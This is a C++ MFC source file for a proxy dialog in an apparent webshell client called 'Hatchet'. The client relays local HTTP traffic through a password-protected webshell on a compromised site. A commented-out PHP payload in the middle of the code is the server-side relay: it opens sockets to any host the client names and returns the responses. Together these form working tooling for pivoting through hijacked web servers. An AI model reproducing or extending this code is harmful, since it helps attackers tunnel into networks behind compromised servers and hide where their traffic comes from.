// ProxyDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Hatchet.h"
#include "ProxyDlg.h"

// CProxyDlg 对话框
CString szPort;
bool bIsbreak;
SOCKET sockSrv;

IMPLEMENT_DYNAMIC(CProxyDlg, CDialog)

CProxyDlg::CProxyDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CProxyDlg::IDD, pParent)
{

}

CProxyDlg::~CProxyDlg()
{
	DestroyWindow();
}

void CProxyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_PROXY_LIST, m_proxy_log);
}


BEGIN_MESSAGE_MAP(CProxyDlg, CDialog)
	ON_BN_CLICKED(IDC_BUTTON_PROXY_START, &CProxyDlg::OnBnClickedButtonProxyStart)
	ON_BN_CLICKED(IDC_BUTTON_PROXY_STOP, &CProxyDlg::OnBnClickedButtonProxyStop)
END_MESSAGE_MAP()


// CProxyDlg 消息处理程序

BOOL CProxyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	GetDlgItem(IDC_EDIT_PROXY_PORT)->SetFont(&m_FontSample);
	GetDlgItem(IDC_STATIC_PROXY_1)->SetFont(&m_FontSample);
	GetDlgItem(IDC_BUTTON_PROXY_START)->SetFont(&m_FontSample);
	GetDlgItem(IDC_PROXY_LIST)->SetFont(&m_FontSample);
	GetDlgItem(IDC_BUTTON_PROXY_STOP)->SetFont(&m_FontSample);

	m_edit.SetWindowText( "Proxy Management" );					//设置状态栏

	szSiteUrl = szGlobal_SiteUrl;
	szSitePass = szGlobal_SitePass;
	nSiteScript = nGlobal_SiteScript;
	nSiteCode = nGlobal_SiteCode;

	SetDlgItemText(IDC_EDIT_PROXY_PORT, "80");

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CProxyDlg::AddLog(CString strMsg)
{
	if (strMsg == "")
	{
		return;
	}
	DWORD Buffer[64]={0};
	struct _SYSTEMTIME SystemTime;
	GetLocalTime(&SystemTime);
	wsprintf(
		(char *)Buffer,
		"%d:%d:%d",
		SystemTime.wHour,
		SystemTime.wMinute,
		SystemTime.wSecond);
	CString temp;
	temp.Format("%s  %s",strMsg,Buffer);
	m_proxy_log.AddString(temp);
	m_proxy_log.SetCurSel(m_proxy_log.GetCount()-1);
}




DWORD WINAPI My_Thread(LPVOID lpParameter)
{
	CProxyDlg* pDlg = (CProxyDlg*)lpParameter;

	CString			szSiteUrl_2 = szGlobal_SiteUrl;
	CString			szSitePass_2 = szGlobal_SitePass;
	int				nSiteCode_2 = nGlobal_SiteScript;
	int				nSiteScript_2 = nGlobal_SiteCode;

	CString temp,temp2;
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD( 1, 1 );

	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 )
	{
		pDlg->AddLog("WSAStartup Fail");
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_START),TRUE);
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_STOP),FALSE);
		return 0;
	}

	if ( LOBYTE( wsaData.wVersion ) != 1 ||	HIBYTE( wsaData.wVersion ) != 1 )
	{
			WSACleanup( );
			pDlg->AddLog("WSACleanup Fail");
			EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_START),TRUE);
			EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_STOP),FALSE);
			return 0;
	}
	sockSrv = socket(AF_INET,SOCK_STREAM,0);
	if (sockSrv == SOCKET_ERROR)
	{
		pDlg->AddLog("socket1 Fail");
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_START),TRUE);
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_STOP),FALSE);
		return 0;
	}
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr=htonl(INADDR_ANY);
	addrSrv.sin_family=AF_INET;
	addrSrv.sin_port=htons(atoi(szPort));

	int nRet;
	nRet = bind(sockSrv,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));
	if(nRet == SOCKET_ERROR)
	{
		pDlg->AddLog("bind Fail");
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_START),TRUE);
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_STOP),FALSE);
		return 0;
	}

	nRet = listen(sockSrv,20);
	if(nRet == SOCKET_ERROR)
	{
		pDlg->AddLog("listen Fail");
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_START),TRUE);
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_STOP),FALSE);
		return 0;
	}

	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);

	pDlg->AddLog("Listening...");
	while(true)
	{

		//if (bIsbreak) break;
		SOCKET sockConn = accept(sockSrv,(SOCKADDR*)&addrClient,&len);

		//////////////////////////////////////////////////////////////////////////
		//nRet = recv(sockConn, recvBuf, 1023, 0);
		char recvBuf[1024];
		temp = "";
		while(true)
		{
			memset(recvBuf, 0, 1024);
			nRet = recv(sockConn, recvBuf, 1023, 0);
			if(nRet <= 0)
			{
				break;
			}
			recvBuf[nRet] = '\0';
			temp2.Format("%s", recvBuf);
			temp += temp2;

			if (nRet < 1023)
			{
				break;
			}
		}
		nRet = temp.GetLength();
		temp2.Format("recv size: %d", nRet);
		pDlg->AddLog(temp2);
		if (nRet == 0)
		{
			continue;
		}
		//////////////////////////////////////////////////////////////////////////
		CString szHost,szPort,szPath,szHeader="";

		int posX=0,posY=0;
		posX = temp.Find(" ");
		posY = temp.Find(" HTTP/", posX);

		bool bIshttps = UrlExplode(temp.Mid(posX+1, posY-posX-1), szHost, szPort, szPath);
		if(bIshttps || szPort == "443")
		{
			szHeader += "a=ssl://&";
		}
		szHeader += "b="+ szHost;
		szHeader += "&c="+ szPort;
		szHeader += "&e="+ MyBase64Encode(-1, temp);
		//////////////////////////////////////////////////////////////////////////
		/*
		@ini_set("display_errors","0");
		@set_time_limit(0);
		@set_magic_quotes_runtime(0);
		echo("->|");
		$a=$_POST["a"];//"ssl://"
		$b=$_POST["b"];//host
		$c=$_POST["c"];//port
		$d=$_POST["d"];//timeout
		$e=base64_decode($_POST["e"]);//header
		$f='';
		$fp = fsockopen($a.$b,$c?$c:80,$errno,$errstr,$d?$d:30);
		if(!$fp) exit("ERROR://".$errstr.$errno."|<-");
		fputs($fp, $e);
		while ($fp && !feof($fp))
		$f .= fread($fp, 1024);
		fclose($fp);
		echo($f."|<-");
		die();
		*/
		bHttpIsOK = MyHttp(szSiteUrl_2, szSitePass_2 + szProxyGetInfo + szHeader, 0, temp, szError);
		//////////////////////////////////////////////////////////////////////////
		if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
		{
			return 0;
		}
		if (!bHttpIsOK)
		{
			pDlg->AddLog("Error");
			break;
		}
		nRet = temp.GetLength();
		szHost.Format("send size: %d", nRet);
		pDlg->AddLog(szHost);
		if (temp.Left(8) == "ERROR://")
		{
			pDlg->AddLog(temp);
		}
		if (nRet == 0)
		{
			continue;
		}
		for (int i=0; i<=nRet; i+=1023)
		{
			temp2 = temp.Mid(i, 1023);
			if ( send(sockConn, temp2, temp2.GetLength(), 0) <= 0)
			{
				break;
			}
		}

		closesocket(sockConn);
		Sleep(10);
	}
	closesocket(sockSrv);
	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_START),TRUE);
	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_BUTTON_PROXY_STOP),FALSE);
	return 0;
}


void CProxyDlg::OnBnClickedButtonProxyStart()
{
	bIsbreak = false;
	GetDlgItemText(IDC_EDIT_PROXY_PORT, szPort);
	if (atoi(szPort) < 1 || atoi(szPort) > 65535)
	{
		AddLog("Port Error!");
		return;
	}
	GetDlgItem(IDC_BUTTON_PROXY_START)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_PROXY_STOP)->EnableWindow(TRUE);

	 szGlobal_SiteUrl = szSiteUrl;
	 szGlobal_SitePass = szSitePass;
	 nGlobal_SiteScript = nSiteScript;
	 nGlobal_SiteCode = nSiteCode;

	hThread = CreateThread(NULL,0,My_Thread,(LPVOID)this,0,0);
}


void CProxyDlg::OnBnClickedButtonProxyStop()
{
//	bIsbreak = true;
	GetDlgItem(IDC_BUTTON_PROXY_START)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON_PROXY_STOP)->EnableWindow(FALSE);

	TerminateThread(hThread, 0 );
	hThread = NULL;

	closesocket(sockSrv);

	return;
}
BOOL CProxyDlg::PreTranslateMessage(MSG* pMsg)
{
	if(pMsg -> message == WM_KEYDOWN)
	{
		if(pMsg -> wParam == VK_ESCAPE)
			return TRUE;
		if(pMsg -> wParam == VK_RETURN)
			return TRUE;
	}
	return CDialog::PreTranslateMessage(pMsg);
}
